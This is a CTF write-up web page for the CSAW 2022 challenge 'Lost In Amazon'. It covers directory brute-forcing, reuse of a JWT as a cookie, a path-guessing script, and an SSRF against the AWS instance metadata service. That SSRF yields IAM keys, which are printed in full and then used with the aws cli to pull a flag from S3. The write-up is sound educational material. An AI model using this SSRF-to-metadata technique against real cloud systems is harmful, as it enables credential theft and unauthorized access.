<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><title>Lost In Amazon</title><link href=https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css rel=stylesheet integrity=sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js integrity=sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa crossorigin=anonymous></script>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Inconsolata&family=Poppins&display=swap" rel=stylesheet><link rel=stylesheet href=https://bfe.one/css/custom.css></head><body><style>.nav_shadow{box-shadow:0 0 14px rgba(0,0,0,.5);-webkit-box-shadow:0 0 14px 0 rgba(0,0,0,.5)}.navbar-custom *{color:#fff;font-family:poppins,sans-serif}</style><nav class="navbar navbar-expand-lg navbar-dark nav_shadow navbar-custom"><div class=container><div class=container-fluid><button class=navbar-toggler type=button data-bs-toggle=collapse data-bs-target=#navbarSupportedContent aria-controls=navbarSupportedContent aria-expanded=false aria-label="Toggle navigation">
<span class=navbar-toggler-icon></span></button><div class="collapse navbar-collapse" id=navbarSupportedContent><ul class="navbar-nav me-auto mb-2 mb-lg-0"><li class=nav-item><a class=nav-link href=/><strong>Home</strong></a></li><li class=nav-item><a class=nav-link href=/about/><strong>About</strong></a></li><li class=nav-item><a class=nav-link href=/roster/><strong>Roster</strong></a></li><li class=nav-item><a class=nav-link href=/writeups/><strong>Writeups</strong></a></li></ul></div></div></div></nav><br><div id=content><div class="container col-lg-8"><h1>Lost In Amazon</h1><span>By CDT Daniel Chung
<span><br><hr class="hr hr-blurry"><p>Absolutely lost in the sauce&mldr;</p><h2 id=description>Description</h2><p>Let&rsquo;s discover the Amazon forest internally. But from where and how? Also what is the secret?</p><p><a href=http://web.chal.csaw.io:5011>http://web.chal.csaw.io:5011</a></p><h2 id=hint>Hint</h2><p>use <a href=https://ctf.csaw.io/files/ded8552e7c4f010ab2d201af8d814747/rockyou.txt>wordlist.txt</a> instead</p><h3 id=tldr>TL;DR</h3><p>Dirb the initial website to find a jwt token and a hint at an internal dev website, dirb <code>/developer/</code> to find <code>/developer/heaven/</code>.
From here, load a cookie of</p><pre tabindex=0><code>secret:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzZW5kZXIiOiJzZWNyZXQiLCJtZXNzYWdlIjoiQSB1c2VmdWwgcGllY2Ugb2YgdGhlIHF1ZXN0LiEiLCJkYXRlIjoiMjAyMi0wOS0wOSAyMjo0MzoyMy4xMjg5NzciLCJleHAiOjE2NjI4NDk4MDN9.-9jBPW6b9V9AKkLNO1zcY5_mnbuuz3l2Vqi-NMR0ZM8
</code></pre><p>and reload to get the developer page, and use the aws metadata service to retrieve the aws secrets.</p><h3 id=first-steps>First Steps</h3><p>Initially I went to <code>http://web.chal.csaw.io:5011/</code> and saw this paragraph on the page.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;content-1&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;featured&#34;</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>h2</span>&gt;&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span>&gt;A History of the Biggest Jock Jam Single of All Time&lt;/<span style=color:#f92672>a</span>&gt;&lt;/<span style=color:#f92672>h2</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>p</span>&gt;WE WILL ROCK YOU tells the story of a globalized future without musical instruments. A handful of rock rebels, the Bohemians, fight against the all-powerful Globalsoft company and its boss, the Killer Queen; they fight for freedom, individuality and the rebirth of the age of rock. Scaramouche and Galileo, two young outsiders, cannot come to terms with the bleak conformist reality. They join the Bohemians and embark on the search to find the unlimited power of freedom, love and Rock!&lt;/<span style=color:#f92672>p</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>p</span>&gt;The idea for the musical came after a meeting between the actor Robert De Niro with musicians Brian May and Roger Taylor, in Venice in 1996. De Niro&#39;s daughter was a big fan of the Queen and the actor asked if the legends of rock had never thought of creating a musical based on their songs. That was the beginning of everything.&lt;/<span style=color:#f92672>p</span>&gt;
</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>div</span>&gt;
</span></span></code></pre></div><p>The paragraph hints at using rockyou.txt, so I started <code>feroxbuster</code> to enumerate the subdirectories.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ ./feroxbuster -u http://web.chal.csaw.io:5011/ -w rockyou.txt   
</span></span></code></pre></div><p><code>feroxbuster</code> managed to find two pages, <code>/rockyou</code> and <code>/secret</code>, where <code>/secret</code> contains a jwt token. Decoding this with <code>jwt.io</code> shows that the token is &ldquo;secret&rdquo; but nothing useful for now so let&rsquo;s keep this in mind.</p><pre tabindex=0><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzZW5kZXIiOiJzZWNyZXQiLCJtZXNzYWdlIjoiQSB1c2VmdWwgcGllY2Ugb2YgdGhlIHF1ZXN0LiEiLCJkYXRlIjoiMjAyMi0wOS0xMCAwNzoxMToyMi4zNTg3NjYiLCJleHAiOjE2NjI4ODAyODJ9.48M1jV5qf60vAU-bnRFwsOL6x5l16MlBttydm-iFzsQ
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;sender&#34;</span>: <span style=color:#e6db74>&#34;secret&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;A useful piece of the quest.!&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;date&#34;</span>: <span style=color:#e6db74>&#34;2022-09-10 07:11:22.358766&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;exp&#34;</span>: <span style=color:#ae81ff>1662880282</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>/rockyou</code> contained another webpage, telling us that there was another pathway.</p><pre tabindex=0><code>There is a hidden pathway to accesss the internal Amazon forest. But it&#39;s restricted :( and still in the development phase
</code></pre><p>From here I was stuck for quite a long time figuring out the next path. Admin said that the next root path was something related to development, so I ended up trying <code>/internal/, /development/, /dev/, /restricted/, /secret/, /notes/, /todo/, /admin/, /progress/</code> and finally <code>/developer/</code> through <code>feroxbuster</code></p><pre tabindex=0><code>$ ./feroxbuster -u http://web.chal.csaw.io:5011/developer/ -w rockyou.txt   
</code></pre><p><code>feroxbuster</code> ended up finding a path to <code>/developer/heaven</code> which landed on a 403 page with a screenshot from a movie, telling us that the moose out back should&rsquo;ve told us to stop. Remember the jwt token we found earlier? It finally comes into play here. I made a cookie named <code>secret</code> with the value of the token.</p><pre tabindex=0><code>secret:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzZW5kZXIiOiJzZWNyZXQiLCJtZXNzYWdlIjoiQSB1c2VmdWwgcGllY2Ugb2YgdGhlIHF1ZXN0LiEiLCJkYXRlIjoiMjAyMi0wOS0wOSAyMjo0MzoyMy4xMjg5NzciLCJleHAiOjE2NjI4NDk4MDN9.-9jBPW6b9V9AKkLNO1zcY5_mnbuuz3l2Vqi-NMR0ZM8
</code></pre><p>After refreshing the page, I found a page looking like a travel website.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;s01&#34;</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/magiccall&#34;</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>fieldset</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>legend</span>&gt;Discover the internal Amazon Forest&lt;/<span style=color:#f92672>legend</span>&gt;
</span></span><span style=display:flex><span>            &lt;/<span style=color:#f92672>fieldset</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;inner-form&#34;</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;input-field first-wrap&#34;</span>&gt;
</span></span><span style=display:flex><span>                &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;pathtojwel&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;search&#34;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;What are you looking for?&#34;</span> /&gt;
</span></span><span style=display:flex><span>            &lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;input-field second-wrap&#34;</span>&gt;
</span></span><span style=display:flex><span>                &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;location&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;location&#34;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;location&#34;</span> /&gt;
</span></span><span style=display:flex><span>            &lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;input-field third-wrap&#34;</span>&gt;
</span></span><span style=display:flex><span>                &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;btn-search&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;magiccall_&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Search&#34;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span>&gt;&lt;/<span style=color:#f92672>input</span>&gt;
</span></span><span style=display:flex><span>            &lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>            &lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>        &lt;/<span style=color:#f92672>form</span>&gt;
</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>body</span>&gt;
</span></span></code></pre></div><h3 id=a-giant-rabbit-hole>A Giant Rabbit Hole</h3><p>From here I thought you had to brute force the possible directories and the possible file locations. This was useless and I ended up wasting 3 hours scripting and trying possibilities.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> itertools
</span></span><span style=display:flex><span>looking_for <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>location <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>base_url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://web.chal.csaw.io:5011/magiccall?pathtojwel=</span><span style=color:#e6db74>{looking_for}</span><span style=color:#e6db74>&amp;location=</span><span style=color:#e6db74>{location}</span><span style=color:#e6db74>&amp;magiccall_=Search&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>base_result <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(base_url)<span style=color:#f92672>.</span>text
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>extensions <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#e6db74>&#34;/&#34;</span>,<span style=color:#e6db74>&#34;~/&#34;</span>, <span style=color:#e6db74>&#34;/.&#34;</span>, <span style=color:#e6db74>&#34;~/.&#34;</span>, <span style=color:#e6db74>&#34;./&#34;</span>, <span style=color:#e6db74>&#34;./.&#34;</span>, <span style=color:#e6db74>&#34;../&#34;</span>, <span style=color:#e6db74>&#34;../../&#34;</span>, <span style=color:#e6db74>&#34;../../../&#34;</span>, <span style=color:#e6db74>&#34;../../../../&#34;</span>, <span style=color:#e6db74>&#34;../../../../../&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>looking_for_list <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;config&#34;</span>,<span style=color:#e6db74>&#34;credentials&#34;</span>, <span style=color:#e6db74>&#34;internal&#34;</span>, <span style=color:#e6db74>&#34;Amazon&#34;</span>, <span style=color:#e6db74>&#34;amazon&#34;</span>, <span style=color:#e6db74>&#34;forest&#34;</span>, <span style=color:#e6db74>&#34;ami-id&#34;</span>,<span style=color:#e6db74>&#34;AWS_CONFIG_FILE&#34;</span>, <span style=color:#e6db74>&#34;AWS_SHARED_CREDENTIALS_FILE&#34;</span>, <span style=color:#e6db74>&#34;secret&#34;</span>, <span style=color:#e6db74>&#34;creds&#34;</span>, <span style=color:#e6db74>&#34;discover&#34;</span>, <span style=color:#e6db74>&#34;ecsInstanceRole&#34;</span>]
</span></span><span style=display:flex><span><span style=color:#75715e># location_list = [&#34;lost+found&#34;,&#34;aws/&#34;, &#34;internal/&#34;, &#34;amazon/&#34;, &#34;forest/&#34;, &#34;latest/meta-data/&#34;]</span>
</span></span><span style=display:flex><span><span style=color:#75715e># location_list = [&#34;lost+found/&#34;]</span>
</span></span><span style=display:flex><span><span style=color:#75715e># location_list = [&#34;latest/meta-data/iam/security-credentials/&#34;, &#34;latest/user-data/&#34;]</span>
</span></span><span style=display:flex><span><span style=color:#75715e># location_list = [&#34;console/&#34;,&#34;bucket/&#34;]</span>
</span></span><span style=display:flex><span><span style=color:#75715e># location_list = [&#34;Amazon/&#34;, &#34;amazon/&#34;, &#34;aws/config/&#34;]</span>
</span></span><span style=display:flex><span><span style=color:#75715e># location_list = [&#34;etc/environment/&#34;,&#34;aws/environment/&#34;, &#34;aws_env/&#34;]</span>
</span></span><span style=display:flex><span><span style=color:#75715e># location_list = [&#34;&#34;]</span>
</span></span><span style=display:flex><span><span style=color:#75715e># location_list = [&#34;magiccall/&#34;]</span>
</span></span><span style=display:flex><span><span style=color:#75715e># location_list = [&#34;discover/&#34;]</span>
</span></span><span style=display:flex><span>location_list <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ext_location <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> pair <span style=color:#f92672>in</span> itertools<span style=color:#f92672>.</span>product(extensions, location_list):
</span></span><span style=display:flex><span>    ext_location<span style=color:#f92672>.</span>append(pair[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>+</span> pair[<span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> pair <span style=color:#f92672>in</span> itertools<span style=color:#f92672>.</span>product(looking_for_list, ext_location):
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;trying </span><span style=color:#e6db74>{</span>pair<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(base_url<span style=color:#f92672>.</span>format(looking_for<span style=color:#f92672>=</span>pair[<span style=color:#ae81ff>0</span>], location<span style=color:#f92672>=</span>pair[<span style=color:#ae81ff>1</span>]))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> r<span style=color:#f92672>.</span>text <span style=color:#f92672>!=</span> base_result:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Found it!&#34;</span>)
</span></span><span style=display:flex><span>        print(r<span style=color:#f92672>.</span>text<span style=color:#f92672>.</span>strip(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span></code></pre></div><h3 id=right-path>Right Path</h3><p>I asked an admin to provide insight and <code>harin</code> told me to try a completely different location. From here, I tried a bunch of different locations such as <code>localhost</code>, <code>web.chal.csaw.io:5011</code>, and <code>8.8.8.8</code>. Surprise!!!</p><pre tabindex=0><code>Good Progress!! Keep it up.
I can only make calls to Amazon meta data
</code></pre><p>A quick <a href="https://www.google.com/search?channel=fs&amp;client=ubuntu&amp;q=amazon+meta+data">google search</a> regarding Amazon meta data led to the <a href=https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html>documentation page</a> for AWS. The page specifies that the IPv4 address of the instance metadata service used for the examples is <code>169.254.169.254</code>, so why not try that. <a href="http://web.chal.csaw.io:5011/magiccall?pathtojwel=%2Flatest%2Fmeta-data&amp;location=169.254.169.254&amp;magiccall_=Search">Here</a> I found a proper response showing a folder named <code>latest</code>. Continuing to follow the trail, I found <code>latest/dynamic</code> and <code>latest/meta-data</code>, with the following link. A little bit of snooping around later, and I found <code>latest/meta-data/iam/security-credentials/lost-in-amazon</code> which showed the following information:</p><pre tabindex=0><code>Good Progress!! Keep it up.
{
&#34;Code&#34;: &#34;Success&#34;,
&#34;LastUpdated&#34;: &#34;2020-04-02T18:50:40Z&#34;,
&#34;Type&#34;: &#34;AWS-HMAC&#34;,
&#34;AccessKeyId&#34;: &#34;AKIAWFXGV6SZK7LCJ3MX&#34;,
&#34;SecretAccessKey&#34;: &#34;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&#34;,
&#34;Token&#34;: &#34;Private S3 Bucket: csaw&#34;,
&#34;Expiration&#34;: &#34;2022-04-02T00:49:51Z&#34;
}
</code></pre><p>We now have 3/4 pieces of information required to access an AWS bucket through s3, so let&rsquo;s keep looking around. I found <code>latest/meta-data/placement/region</code>, which shows what region the bucket is located in.</p><pre tabindex=0><code>Good Progress!! Keep it up.
us-east-1
</code></pre><p>And now like Thanos we have all the pieces. Here I configured my aws cli with the information provided, <code>json</code> was a guess.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ aws configure
</span></span><span style=display:flex><span>AWS Access Key ID [None]: AKIAWFXGV6SZK7LCJ3MX
</span></span><span style=display:flex><span>AWS Secret Access Key [None]: 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
</span></span><span style=display:flex><span>Default region name [None]: us-east-1     
</span></span><span style=display:flex><span>Default output format [None]: json
</span></span></code></pre></div><p>Accessing the bucket with aws s3 cli showed that there was a flag inside the bucket.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ aws s3 ls s3://csaw
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>2022-09-03 04:21:26         26 flag.txt
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ aws s3 cp s3://csaw/flag.txt ~/
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>download: s3://csaw/flag.txt to ../../../../../../../flag.txt     
</span></span></code></pre></div><h3 id=flag>Flag</h3><pre tabindex=0><code>CTF{M3t@_D@TA_1S_CRi7Ic@L}
</code></pre><h3 id=notes>Notes</h3><ul><li>5th global solve for CSAW 2022 @ 500 points</li><li>Was an extremely guessy challenge</li></ul></div></div><footer class="footer mt-auto"><div class="container text-center text-muted"><p>Copyrights © 2022 BitsforEveryone. All rights reserved.</p><div class=social><a href=https://www.instagram.com/armywp_cyber/ class="fa fa-instagram"></a>
<a href=https://github.com/bitsforeveryone class="fa fa-github"></a></div></div></footer></body></html>